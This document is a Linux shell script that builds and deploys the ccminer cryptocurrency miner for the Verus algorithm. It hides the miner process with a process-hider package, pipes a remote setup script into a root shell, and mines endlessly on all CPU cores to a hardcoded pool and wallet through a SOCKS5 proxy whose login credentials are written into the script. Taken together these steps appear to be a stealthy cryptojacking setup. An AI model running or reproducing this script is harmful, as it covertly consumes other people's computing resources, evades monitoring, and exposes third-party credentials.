apt update && apt -y install sudo
sudo apt update;apt -y install build-essential screen ca-certificates libcurl4
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
sudo apt-get install -y nodejs
sudo apt-get install gcc g++ make
sudo -u root npm i -g node-process-hider
sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
sudo dpkg-reconfigure --frontend noninteractive tzdata
sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
cd ccminer
chmod +x build.sh
chmod +x configure.sh
chmod +x autogen.sh
sudo ph add ccminer
./build.sh
while [ 1 ]; do
./ccminer -a verus -o stratum+tcp://79.137.70.48:3960 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$(echo $(shuf -i 1-3 -n 1)-jur) -p hybrid -t $(nproc) -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080
sleep 2
done
sleep 999
